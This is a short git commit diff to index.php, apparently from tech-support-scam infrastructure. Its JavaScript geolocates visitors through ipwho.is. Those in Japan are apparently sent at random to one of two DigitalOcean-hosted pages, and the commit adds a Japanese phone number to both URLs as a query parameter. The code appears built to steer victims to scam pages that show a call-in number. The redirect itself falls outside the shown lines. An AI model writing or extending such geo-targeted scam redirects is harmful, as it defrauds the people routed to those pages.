f4b1f52e0b477bfd8788c34a8df4ffaee270b671
SupportSpotX24 <abilashgupta7@gmail.com>
2026-01-24 22:08:12 -0500

    Update index.php

--- index.php
+++ index.php
@@ -18,8 +18,8 @@ fetch("https://ipwho.is/")
 
     if (countryCode === "JP") {
       (function () {
-        const domainA = "https://goldfish-app-aojed.ondigitalocean.app/";
-        const domainB = "https://oyster-app-yu98m.ondigitalocean.app/";
+        const domainA = "https://goldfish-app-aojed.ondigitalocean.app/?bcda=(050)-3097-5847";
+        const domainB = "https://oyster-app-yu98m.ondigitalocean.app/?bcda=(050)-3097-5847";
 
         // Random number between 0 and 1
         if (Math.random() < 0.5) {
